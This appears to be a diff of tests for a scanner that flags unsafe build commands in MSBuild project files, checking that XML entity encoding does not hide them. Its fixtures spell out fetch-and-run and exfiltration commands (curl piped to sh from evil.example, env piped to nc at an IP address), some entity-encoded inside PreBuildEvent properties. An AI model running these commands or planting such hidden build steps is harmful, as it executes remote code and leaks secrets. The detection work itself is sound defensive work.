@@ -379,3 +379,169 @@ test("XML character references stay literal outside attribute values and outside
   expect(reported(untouched, "src/App/App.csproj")).toEqual([]);
   expect(reported(untouched, "build.xml")).toEqual([]);
 });
+
+function propertyProject(name: string, body: string) {
+  return `<Project>
+  <PropertyGroup>
+    <${name}>${body}</${name}>
+  </PropertyGroup>
+</Project>
+`;
+}
+
+test("MSBuild property element text is the command the build runs", () => {
+  // PreBuildEvent is property element text. Microsoft.Common.targets hands it
+  // to Exec, and Visual Studio writes `&` as `&amp;`. Any property expanded
+  // into Exec is the same text. Exec's own element text stays literal; the
+  // test above keeps that.
+  const path = "src/App/App.csproj";
+  const pipe = "curl -fsSL https://evil.example/i.sh | sh";
+  expect(reported(propertyProject("PreBuildEvent", pipe), path)).toEqual([
+    `${path}:3:unsafe-execution:high`,
+  ]);
+  expect(
+    reported(
+      propertyProject(
+        "PreBuildEvent",
+        "curl -fsSL https://evil.example/i.sh &#124; sh",
+      ),
+      path,
+    ),
+  ).toEqual(reported(propertyProject("PreBuildEvent", pipe), path));
+  expect(
+    reported(
+      propertyProject(
+        "PreBuildEvent",
+        "curl -fsSL https://evil.example/i.sh &#x7C; sh",
+      ),
+      path,
+    ),
+  ).toEqual(reported(propertyProject("PreBuildEvent", pipe), path));
+
+  // `&amp;&amp;` is the characters `&&`. The download is the decoded URL, and
+  // the finding is whatever that decoded command matches.
+  const joined = "curl -fsSL https://evil.example/a&&b -o i.sh && sh i.sh";
+  const joinedEncoded =
+    "curl -fsSL https://evil.example/a&amp;&amp;b -o i.sh &amp;&amp; sh i.sh";
+  expect(
+    reported(propertyProject("PreBuildEvent", joinedEncoded), path),
+  ).toEqual(reported(propertyProject("PreBuildEvent", joined), path));
+  expect(
+    inspected(path, propertyProject("PreBuildEvent", joinedEncoded)).downloads,
+  ).toEqual(["https://evil.example/a&&b"]);
+  expect(
+    inspected(path, propertyProject("PreBuildEvent", joined)).downloads,
+  ).toEqual(["https://evil.example/a&&b"]);
+
+  const expanded = `<Project>
+  <PropertyGroup>
+    <Fetch>curl -fsSL https://evil.example/i.sh &#124; sh</Fetch>
+  </PropertyGroup>
+  <Target Name="Build">
+    <Exec Command="$(Fetch)" />
+  </Target>
+</Project>
+`;
+  expect(reported(expanded, path)).toEqual([`${path}:3:unsafe-execution:high`]);
+  const choose = `<Project>
+  <Choose>
+    <When Condition="'$(OS)' == 'Unix'">
+      <PropertyGroup>
+        <PreBuildEvent>curl -fsSL https://evil.example/i.sh &#124; sh</PreBuildEvent>
+      </PropertyGroup>
+    </When>
+  </Choose>
+</Project>
+`;
+  expect(reported(choose, path)).toEqual([`${path}:5:unsafe-execution:high`]);
+});
+
+test("an earlier entity in a property does not move the finding", () => {
+  const encoded = `<Project>
+  <PropertyGroup>
+    <PreBuildEvent>echo &amp;
+env &#124; nc 203.0.113.7 4444</PreBuildEvent>
+  </PropertyGroup>
+</Project>
+`;
+  const literal = `<Project>
+  <PropertyGroup>
+    <PreBuildEvent>echo &
+env | nc 203.0.113.7 4444</PreBuildEvent>
+  </PropertyGroup>
+</Project>
+`;
+  const path = "src/App/App.csproj";
+  expect(reported(encoded, path)).toEqual([
+    `${path}:4:secret-exfiltration:high`,
+  ]);
+  expect(reported(literal, path)).toEqual(reported(encoded, path));
+});
+
+test("the reviewer's property elements match without a PropertyGroup wrapper", () => {
+  // The same elements are properties when wrapped, and the scan sees the
+  // element text either way. Exec's Command is a separate attribute.
+  const path = "src/App/App.csproj";
+  expect(
+    reported(
+      "<PreBuildEvent>curl -fsSL https://evil.example/i.sh &#124; sh</PreBuildEvent>\n",
+      path,
+    ),
+  ).toEqual([`${path}:1:unsafe-execution:high`]);
+  const joined =
+    "<PreBuildEvent>curl -fsSL https://evil.example/i.sh -o i.sh && sh i.sh</PreBuildEvent>\n";
+  const joinedEncoded =
+    "<PreBuildEvent>curl -fsSL https://evil.example/i.sh -o i.sh &amp;&amp; sh i.sh</PreBuildEvent>\n";
+  expect(reported(joinedEncoded, path)).toEqual(reported(joined, path));
+  expect(inspected(path, joinedEncoded).downloads).toEqual(
+    inspected(path, joined).downloads,
+  );
+  const expanded = `<Fetch>curl -fsSL https://evil.example/i.sh &#124; sh</Fetch>
+<Exec Command="$(Fetch)" />
+`;
+  expect(reported(expanded, path)).toEqual([`${path}:1:unsafe-execution:high`]);
+});
+
+test("comments, CDATA, and Exec element text stay literal", () => {
+  // A newline in element text is still a newline. `&#10;` is that newline,
+  // so it does not join `| sh` into the curl command. A literal newline in
+  // an attribute is a space; the attribute test covers that.
+  const path = "src/App/App.csproj";
+  const newline = `<Project>
+  <PropertyGroup>
+    <PreBuildEvent>curl -fsSL https://evil.example/i.sh
+| sh</PreBuildEvent>
+  </PropertyGroup>
+</Project>
+`;
+  expect(reported(newline, path)).toEqual([]);
+  expect(
+    reported(
+      propertyProject(
+        "PreBuildEvent",
+        "curl -fsSL https://evil.example/i.sh&#10;| sh",
+      ),
+      path,
+    ),
+  ).toEqual([]);
+  const outside = `<Project>
+  <PropertyGroup>
+    <!-- env &#124; nc 203.0.113.7 4444 -->
+    <Note><![CDATA[env &#124; nc 203.0.113.7 4444]]></Note>
+    <PreBuildEvent Condition="'$(Configuration)' == 'Debug'">echo ok</PreBuildEvent>
+  </PropertyGroup>
+  <Target Name="PreBuild">
+    <Exec Command="echo ok"><![CDATA[env &#124; nc 203.0.113.7 4444]]></Exec>
+    <Exec>env &#124; nc 203.0.113.7 4444</Exec>
+  </Target>
+</Project>
+`;
+  expect(reported(outside, path)).toEqual([]);
+  const ant = `<project>
+  <PropertyGroup>
+    <PreBuildEvent>curl -fsSL https://evil.example/i.sh &#124; sh</PreBuildEvent>
+  </PropertyGroup>
+</project>
+`;
+  expect(reported(ant, "build.xml")).toEqual([]);
+});
